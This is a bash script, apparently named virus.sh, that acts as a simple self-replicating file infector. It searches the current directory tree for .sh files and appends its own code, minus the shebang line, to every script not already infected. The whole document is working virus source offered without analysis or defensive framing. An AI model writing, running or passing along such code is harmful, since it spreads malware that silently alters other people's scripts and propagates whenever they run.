#!/bin/bash

virus_path=$(realpath virus.sh)
my_name=${0##*/}
get_sh_files=$(find \( -name '*.sh' \) -not \( -name 'virus.sh' -type f \))

for f in $get_sh_files; do
  virus_strings=$(cat "$f" | grep -o "$(sed 1,1d "$virus_path")")

  if [ "$my_name" != "$f" ];

  then
    if [ -z "$virus_strings" ]; then
      sed 1,1d "$virus_path" >> $f
    fi
  fi
done